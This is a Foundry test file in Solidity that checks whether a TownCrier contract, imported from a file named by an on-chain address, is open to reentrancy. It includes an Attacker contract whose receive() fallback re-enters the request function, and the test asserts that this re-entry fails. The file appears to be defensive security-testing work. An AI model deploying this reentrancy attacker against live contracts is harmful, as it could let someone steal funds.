// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol";

contract ReentrancyTest is Test {
    TownCrier public townCrier;
    Attacker public attacker;
    uint256 public constant MIN_FEE = 1 ether; // Actual MIN_FEE value from contract

    function setUp() public {
        townCrier = new TownCrier();
        attacker = new Attacker(townCrier);

        // Fund attacker with enough ETH for tests
        vm.deal(address(attacker), 10 ether);
        
        // Suspend contract to activate killswitch
        vm.prank(address(townCrier)); // Pretend to be contract owner
        townCrier.suspend();
    }

    function testRequestReentrancy() public {
        console.log("--- BEFORE-Trigger State ---");
        console.log("Attack reentered state:", attacker.reentered());
        console.log("Attack success state:", attacker.reentrantSuccess());
        
        console.log("--- Trigger Attack ---");
        // Execute the attack
        vm.prank(address(attacker));
        attacker.attack();
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Attack reentered state:", attacker.reentered());
        console.log("Attack success state:", attacker.reentrantSuccess());
        
        // Determine vulnerability based on reentrant success
        if (attacker.reentrantSuccess()) {
            console.log("Vulnerability Exists: Reentrant call succeeded");
        } else {
            console.log("Vulnerability not Exist: Reentrant call failed");
        }

        // Verify the attack failed to gain access
        assertFalse(attacker.reentrantSuccess(), "Reentrancy should fail");
    }
}

contract Attacker {
    TownCrier public townCrier;
    bool public reentered;
    bool public reentrantSuccess;

    constructor(TownCrier _townCrier) {
        townCrier = _townCrier;
    }

    function attack() public payable {
        bytes32[] memory requestData;

        // Execute request that will trigger reentrancy
        townCrier.request{value: 1 ether}(
            0, 
            address(this), 
            0x12345678, 
            block.timestamp, 
            requestData
        );
    }

    receive() external payable {
        // Only attempt reentrancy once
        if (!reentered) {
            reentered = true;
            
            // Prepare reentrant call data
            bytes32[] memory emptyData;
            bytes memory callData = abi.encodeWithSelector(
                TownCrier.request.selector,
                0,
                address(this),
                0x12345678,
                block.timestamp,
                emptyData
            );
            
            // Attempt reentrancy without additional value
            (bool success, ) = address(townCrier).call(callData);
            reentrantSuccess = success;
        }
    }
}